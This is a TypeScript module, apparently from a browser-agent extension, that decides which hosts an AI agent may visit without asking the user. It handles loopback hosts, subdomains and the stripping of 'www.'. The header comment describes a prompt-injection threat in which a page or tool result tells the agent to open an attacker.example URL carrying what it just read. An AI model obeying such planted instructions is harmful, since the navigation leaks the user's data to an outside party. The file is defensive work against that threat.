/*---------------------------------------------------------------------------------------------
 *  Licensed under the MIT License. See LICENSE in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

/**
 * Which sites an agent may open without asking. Leaf module, under test.
 *
 * The threat is a page — or a file, or a tool result — telling the agent to
 * "open https://attacker.example/?d=<what you just read>": the navigation *is*
 * the leak. So a host the conversation has not been to is asked about once, in
 * a modal the extension shows itself (no CLI rule or Auto mode answers it), and
 * the modal shows the whole address so data in the query string is visible.
 *
 * A host counts as known when it is a loopback host, the host of the tab being
 * navigated, or a host approved earlier for this caller — or a subdomain of one
 * (`docs.example.com` once `example.com` is approved). A leading `www.` is not
 * part of the site. The parent of an approved host is *not* covered:
 * `user.github.io` approved says nothing about `github.io`.
 */

const loopback = new Set(['localhost', '127.0.0.1', '0.0.0.0', '[::1]', '[::]', '::1']);

export function isLoopbackHost(host: string): boolean {
	const h = host.toLowerCase();
	return loopback.has(h) || h.endsWith('.localhost') || /^127\.\d+\.\d+\.\d+$/.test(h);
}

/** Suffixes under which every name is somebody else's site: `www.` is never dropped onto one. */
const sharedSuffixes = new Set([
	'github.io', 'gitlab.io', 'pages.dev', 'workers.dev', 'vercel.app', 'netlify.app', 'herokuapp.com',
	'web.app', 'firebaseapp.com', 'appspot.com', 'azurewebsites.net', 'blogspot.com', 'onrender.com', 'fly.dev',
]);

/**
 * Whether `www.<rest>` may be read as `<rest>`. Not when `<rest>` is one label, a
 * country's second-level suffix (`co.uk`, `com.au`: a short label over a two-letter
 * one) or a shared hosting suffix — approving `www.co.uk` must not approve every
 * `*.co.uk`. Without the Public Suffix List this errs towards keeping `www.`, which
 * costs at most one more question.
 */
function wwwDroppable(rest: string): boolean {
	const labels = rest.split('.');
	if (labels.length < 2 || sharedSuffixes.has(rest)) { return false; }
	return !(labels.length === 2 && labels[0].length <= 3 && labels[1].length === 2);
}

/** The host as a site: lower case, without a trailing dot, and without a leading `www.` where that is safe. */
export function siteOf(host: string): string {
	const h = host.toLowerCase().replace(/\.$/, '');
	const rest = h.startsWith('www.') ? h.slice(4) : undefined;
	return rest !== undefined && wwwDroppable(rest) ? rest : h;
}

export function isKnownSite(host: string, known: Iterable<string>): boolean {
	if (isLoopbackHost(host)) {
		return true;
	}
	const site = siteOf(host);
	for (const entry of known) {
		const k = siteOf(entry);
		if (k && (site === k || site.endsWith(`.${k}`))) {
			return true;
		}
	}
	return false;
}

/** The address as the question shows it: whole up to a limit, the rest counted. */
export function addressForQuestion(url: string, limit = 400): string {
	const chars = [...url];
	return chars.length <= limit ? url : `${chars.slice(0, limit).join('')}… (${chars.length - limit} more characters)`;
}
